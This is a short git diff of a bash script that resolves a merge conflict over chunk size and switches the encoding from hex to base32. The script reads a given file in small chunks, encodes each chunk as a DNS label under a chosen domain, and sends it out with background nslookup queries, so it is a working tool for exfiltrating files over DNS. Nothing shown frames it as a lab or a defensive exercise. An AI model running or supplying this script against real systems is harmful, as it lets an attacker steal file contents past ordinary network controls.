@@ -1,10 +1,6 @@
 #!/bin/bash
 
-<<<<<<< HEAD
-chunk=4
-=======
-chunk=8
->>>>>>> 1be65f35fb7e9891fffc5ac264537e8e4c89fcaf
+chunk=5
 domain=$2
 file=$1
 
@@ -27,7 +23,7 @@ fi
 
 skip=0
 while [ "$((skip*chunk))" -lt "$size" ] ; do
-	q=$(dd if="$file" skip=$skip bs=$chunk count=1 2>/dev/null | xxd -ps -c 200)."$domain"
+	q=$(dd if="$file" skip=$skip bs=$chunk count=1 2>/dev/null | base32)."$domain"
 	#echo "$q"
 	nslookup "$q" &
 	pid="$!"
